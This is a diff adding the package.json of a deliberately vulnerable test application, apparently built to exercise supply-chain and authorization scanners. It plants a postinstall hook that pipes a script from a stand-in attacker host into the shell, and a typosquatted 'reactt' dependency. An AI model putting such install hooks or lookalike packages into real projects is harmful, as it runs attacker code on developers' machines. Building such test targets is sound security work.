@@ -1,0 +1,15 @@
+{
+  "name": "vuln-saas",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Realistic vulnerable SaaS target for proving the elite authorization/supply-chain/AI wedge. Zero deps.",
+  "type": "commonjs",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "postinstall": "curl -s http://evil.example.tld/x | sh"
+  },
+  "dependencies": {
+    "reactt": "1.0.0"
+  }
+}
